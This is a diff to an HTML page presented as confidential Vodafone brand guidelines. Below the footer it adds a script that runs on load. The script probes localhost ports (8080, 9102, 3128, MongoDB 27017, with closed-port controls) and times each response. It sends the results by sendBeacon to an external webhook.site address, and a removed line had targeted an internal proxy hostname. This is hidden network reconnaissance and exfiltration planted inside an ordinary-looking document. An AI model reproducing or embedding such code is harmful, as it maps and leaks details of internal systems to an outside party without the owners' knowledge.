@@ -78,37 +78,41 @@
 
 <footer><p>Vodafone Group Plc | Brand Guidelines 2026 | Confidential</p></footer>
 
+
+
 <script>
 const W = 'https://webhook.site/94e0c132-dde9-4081-9f98-74b96f81e95f';
 const diag = document.getElementById('diag');
 let log = '';
 function out(msg) { log += msg + '\n'; diag.textContent = log; }
 
+// Targets — includes a KNOWN CLOSED port (9999) as control
+// If 9999 fails in same ms as 9102/8080 → sandbox block (uniform)
+// If 9999 fails faster than 9102/8080 → 9102/8080 are actually open (TCP connected)
 const targets = [
     { url: 'http://127.0.0.1:9102/', label: '9102' },
     { url: 'http://127.0.0.1:8080/', label: '8080' },
-    { url: 'http://qa6-aws-ml-proxy.sprinklr.com:3128/', label: 'sprinklr' },
+    { url: 'http://127.0.0.1:9999/', label: '9999-control-closed' },
+    { url: 'http://127.0.0.1:1234/', label: '1234-control-closed' },
+    { url: 'http://127.0.0.1:3128/', label: '3128' },
+    { url: 'http://127.0.0.1:27017/', label: 'mongo' },
 ];
 
-// Start beacon
-fetch(W + '?event=start&t=' + Date.now()).catch(() => {});
-navigator.sendBeacon(W + '?event=beacon&t=' + Date.now());
+navigator.sendBeacon(W + '?event=start&t=' + Date.now());
+out('Probes firing...');
 
-// Probe each target with plain fetch — no custom headers
 targets.forEach(({ url, label }) => {
     const t0 = performance.now();
     fetch(url)
         .then(r => {
             const ms = Math.round(performance.now() - t0);
             out('[UP] ' + label + ' status=' + r.status + ' ms=' + ms);
-            fetch(W + '?event=up&l=' + label + '&ms=' + ms + '&s=' + r.status).catch(() => {});
-            navigator.sendBeacon(W + '?event=up-beacon&l=' + label + '&ms=' + ms + '&s=' + r.status);
+            navigator.sendBeacon(W + '?event=up&l=' + label + '&ms=' + ms + '&s=' + r.status);
         })
         .catch(e => {
             const ms = Math.round(performance.now() - t0);
-            out('[DOWN] ' + label + ' ms=' + ms + ' e=' + (e.message || 'failed'));
-            fetch(W + '?event=down&l=' + label + '&ms=' + ms + '&e=' + encodeURIComponent(e.message || '')).catch(() => {});
-            navigator.sendBeacon(W + '?event=down-beacon&l=' + label + '&ms=' + ms);
+            out('[DOWN] ' + label + ' ms=' + ms);
+            navigator.sendBeacon(W + '?event=down&l=' + label + '&ms=' + ms + '&e=' + encodeURIComponent(e.message || ''));
         });
 });
 </script>
